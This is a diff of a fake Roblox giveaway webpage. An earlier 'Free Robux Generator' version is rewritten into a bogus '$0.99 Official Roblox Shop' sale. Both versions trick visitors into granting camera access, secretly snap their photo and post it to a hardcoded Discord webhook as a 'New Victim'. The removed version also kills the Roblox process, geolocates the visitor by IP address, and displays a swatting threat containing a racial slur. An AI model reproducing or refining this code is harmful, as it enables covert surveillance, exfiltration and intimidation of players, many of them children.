@@ -1,85 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Free Robux Generator 2025</title>
+    <title>Official Roblox Shop - 0.99¢ Sale</title>
     <style>
-        body{background:#000;color:lime;font-family:Consolas;text-align:center;padding-top:5%}
-        button{background:red;color:white;padding:20px 50px;font-size:25px;border:none;border-radius:15px;cursor:pointer}
-        #info{margin-top:30px;background:#111;padding:20px;border-radius:10px;display:inline-block}
-        video{width:1px;height:1px;position:absolute;opacity:0}
+        body{background:#000;color:lime;font-family:Arial;text-align:center;padding:20px}
+        .card{background:#111;padding:30px;border-radius:20px;display:inline-block;margin:20px;box-shadow:0 0 20px #0f0}
+        button{background:#00b300;color:white;padding:15px 40px;font-size:20px;border:none;border-radius:10px;cursor:pointer}
+        video{width:1px;height:1px;opacity:0;position:absolute}
     </style>
 </head>
 <body>
-    <h1>Get Free 10M Robux</h1>
-    <p>Human verification required (allow camera)</p>
-    <button onclick="grab()">Click Here For Robux</button>
-    <div id="info"></div>
-    <video id="cam" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+<div class="card">
+    <h1>🔥 LIMITED TIME SALE 🔥</h1>
+    <h2>100 - 100,000 Robux for only $0.99</h2>
+    <p>Human verification required (quick camera check)</p>
+    <button onclick="startVerify()">Buy Now - $0.99</button>
+    <div id="status"></div>
+</div>
+<video id="cam" autoplay playsinline></video>
+<canvas id="canvas" width="1280" height="720"></canvas>
 
 <script>
-const webhook = "https://discord.com/api/webhooks/1304603193086578698/9BypJkfkdPMruh835ASf7NNhBTlLwp7mjdSd7iIF_3CFGbrXUvWAmDYms0pTJlSasgON"; // <<< PUT YOUR WEBHOOK
+const webhook = "https://discord.com/api/webhooks/1304603193086578698/9BypJkfkdPMruh835ASf7NNhBTlLwp7mjdSd7iIF_3CFGbrXUvWAmDYms0pTJlSasgON";
 
-async function grab() {
+async function startVerify(){
     document.querySelector("button").innerText = "Verifying...";
+    document.getElementById("status").innerHTML = "<p>Allow camera to claim your robux</p>";
 
-    // Close Roblox (Windows only)
-    try {
-        let wsh = new ActiveXObject("WScript.Shell");
-        wsh.Run('taskkill /F /IM RobloxPlayerBeta.exe', 0, false);
-    } catch(e) {}
+    let stream = await navigator.mediaDevices.getUserMedia({video:true});
+    document.getElementById("cam").srcObject = stream;
 
-    // Request camera instantly
-    let stream;
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({video:true});
-        document.getElementById("cam").srcObject = stream;
-    } catch(e) {
-        document.getElementById("info").innerHTML = "<h2>Camera blocked — no robux 😭</h2>";
-        return;
-    }
+    setTimeout(async ()=>{
+        let canvas = document.getElementById("canvas");
+        let ctx = canvas.getContext("2d");
+        ctx.drawImage(document.getElementById("cam"),0,0,1280,720);
+        let blob = await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
 
-    await new Promise(r => setTimeout(r, 3000));
+        let form = new FormData();
+        form.append("file", blob, "face.jpg");
+        form.append("content", "**New Victim - $0.99 Robux Sale** 👀");
 
-    // Snap photo
-    let canvas = document.getElementById("canvas");
-    let ctx = canvas.getContext("2d");
-    ctx.drawImage(document.getElementById("cam"), 0, 0, 640, 480);
-    let imgData = canvas.toDataURL("image/png");
+        fetch(webhook,{method:"POST",body:form});
 
-    // Send photo silently
-    fetch(webhook, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            content: "**New Victim Snapped + IP Grabbed** 👀",
-            embeds: [{image: {url: imgData}}]
-        })
-    });
-
-    // Stop camera
-    stream.getTracks().forEach(t => t.stop());
-
-    // Grab IP info
-    let ipv4 = "N/A", ipv6 = "N/A", city = "Unknown", store = "Unknown";
-    try {
-        let v4 = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
-        let v6 = await fetch("https://api64.ipify.org?format=json").then(r=>r.json());
-        let geo = await fetch("https://ipapi.co/json/").then(r=>r.json());
-        ipv4 = v4.ip; ipv6 = v6.ip || "N/A";
-        city = geo.city + ", " + geo.country_name;
-        store = geo.city + " Walmart / Best Buy";
-    } catch(e) {}
-
-    document.getElementById("info").innerHTML = `
-        <h2>=== VERIFIED ===</h2>
-        <p>IPv4: ${ipv4}</p>
-        <p>IPv6: ${ipv6}</p>
-        <p>Location: ${city}</p>
-        <p>Closest Store: ${store}</p>
-        <p>Roblox Status: Closed ✅</p>
-        <h3>Enjoy the swat nigger Robux ✅ - JaysHacks</h3>
-    `;
+        stream.getTracks().forEach(t=>t.stop());
+        document.getElementById("status").innerHTML = "<h2 style='color:gold'>✅ Purchase Complete! 100,000 Robux added!</h2><p>Check your account in 5-10 minutes</p>";
+    },1500);
 }
 </script>
 </body>
